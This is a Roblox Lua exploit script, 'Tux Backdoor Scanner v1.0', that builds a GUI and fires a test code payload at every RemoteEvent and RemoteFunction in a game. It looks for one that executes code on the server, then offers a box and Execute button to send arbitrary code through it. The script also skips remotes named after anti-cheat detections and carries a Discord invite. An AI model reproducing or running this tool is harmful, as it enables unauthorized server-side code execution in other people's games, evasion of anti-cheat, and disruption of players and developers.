local TUX = {};

--// StarterGui.Tux
TUX["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
TUX["1"]["DisplayOrder"] = 1999999999;
TUX["1"]["Name"] = [[Tux]];
TUX["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
TUX["1"]["ResetOnSpawn"] = false;


--// StarterGui.Tux.MainFrame
TUX["2"] = Instance.new("Frame", TUX["1"]);
TUX["2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
TUX["2"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
TUX["2"]["Size"] = UDim2.new(0, 400, 0, 200);
TUX["2"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
TUX["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
TUX["2"]["Name"] = [[MainFrame]];


--// StarterGui.Tux.MainFrame.Title
TUX["3"] = Instance.new("TextLabel", TUX["2"]);
TUX["3"]["BorderSizePixel"] = 0;
TUX["3"]["TextSize"] = 16;
TUX["3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
TUX["3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
TUX["3"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
TUX["3"]["BackgroundTransparency"] = 1;
TUX["3"]["Size"] = UDim2.new(1, 0, 0, 24);
TUX["3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
TUX["3"]["Text"] = [[Tux Backdoor Scanner v1.0]];
TUX["3"]["Name"] = [[Title]];


--// StarterGui.Tux.MainFrame.Scan
TUX["4"] = Instance.new("TextButton", TUX["2"]);
TUX["4"]["TextSize"] = 24;
TUX["4"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
TUX["4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
TUX["4"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
TUX["4"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
TUX["4"]["Size"] = UDim2.new(0, 200, 0, 50);
TUX["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
TUX["4"]["Text"] = [[Scan Game]];
TUX["4"]["Name"] = [[Scan]];
TUX["4"]["Position"] = UDim2.new(0.5, 0, 0.5, 18);


--// StarterGui.Tux.MainFrame.Handler
TUX["5"] = Instance.new("LocalScript", TUX["2"]);
TUX["5"]["Name"] = [[Handler]];


--// StarterGui.Tux.MainFrame.CodeBox
TUX["6"] = Instance.new("TextBox", TUX["2"]);
TUX["6"]["Visible"] = false;
TUX["6"]["Name"] = [[CodeBox]];
TUX["6"]["TextXAlignment"] = Enum.TextXAlignment.Left;
TUX["6"]["TextWrapped"] = true;
TUX["6"]["TextSize"] = 14;
TUX["6"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
TUX["6"]["TextYAlignment"] = Enum.TextYAlignment.Top;
TUX["6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
TUX["6"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
TUX["6"]["MultiLine"] = true;
TUX["6"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
TUX["6"]["ClearTextOnFocus"] = false;
TUX["6"]["Size"] = UDim2.new(1, -15, 1, -75);
TUX["6"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
TUX["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
TUX["6"]["Text"] = [[--////.gg/bXQfb3QWa8]];


--// StarterGui.Tux.MainFrame.Exe
TUX["7"] = Instance.new("TextButton", TUX["2"]);
TUX["7"]["TextSize"] = 14;
TUX["7"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
TUX["7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
TUX["7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
TUX["7"]["AnchorPoint"] = Vector2.new(0.5, 0);
TUX["7"]["Size"] = UDim2.new(0, 200, 0, 24);
TUX["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
TUX["7"]["Text"] = [[Execute]];
TUX["7"]["Name"] = [[Exe]];
TUX["7"]["Visible"] = false;
TUX["7"]["Position"] = UDim2.new(0.5, 0, 0, 170);


--// StarterGui.Tux.MainFrame.UIDragDetector
TUX["8"] = Instance.new("UIDragDetector", TUX["2"]);



--// StarterGui.Tux.MainFrame.Handler
local function C_5()
local script = TUX["5"];
	local mainframe = script.Parent
	local scanbutton = mainframe.Scan
	local codebox = mainframe.CodeBox
	local execute = mainframe.Exe
	local safetime = 0.1
	
	local blacklistedstrings = {"CheatDetected","ExploitDetected"}
	
	local holygrail = nil
	
	local testcode = "a=Instance.new(\"Part\",workspace)a.Name=\"MrBlock_7101\""
	
	local function fire(rem,code)
		if rem:IsA("RemoteEvent") then
			rem:FireServer(code)
		elseif rem:IsA("RemoteFunction") then
			rem:InvokeServer(code)
		end
	end
	
	local function testremote(remote)
		fire(remote,testcode)
		task.wait(safetime)
		if workspace:FindFirstChild("MrBlock_7101") then
			return true
		end
		return false
	end
	
	scanbutton.MouseButton1Click:Connect(function()
		for _, r in ipairs(game:GetDescendants()) do
			if r.Parent.Name == "RobloxReplicatedStorage" 
				or r.Parent.Name == "DefaultChatSystemChatEvents" then continue end
			
			if r:IsA("RemoteEvent") or r:IsA("RemoteFunction") then
				if string.find(r.Name,#blacklistedstrings) then
					continue
				else
					scanbutton.Text = "Testing: "..r.Name
					if testremote(r) then
						holygrail = r
						break
					end
				end
			end
		end
		if holygrail then
			scanbutton.Text = "Found"
			scanbutton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
			scanbutton.TextColor3 = Color3.fromRGB(0, 0, 0)
			print(holygrail:GetFullName())
			task.wait(1)
			scanbutton.Visible = false
			codebox.Visible = true
			execute.Visible = true
		else
			scanbutton.Text = "Not Found"
			scanbutton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
			scanbutton.TextColor3 = Color3.fromRGB(255, 255, 255)
			task.wait(2)
			mainframe.Parent:Destroy()
		end
	end)
	
	execute.MouseButton1Click:Connect(function()
		fire(holygrail,codebox.Text)
	end)
end;
task.spawn(C_5);

return TUX["1"], require;
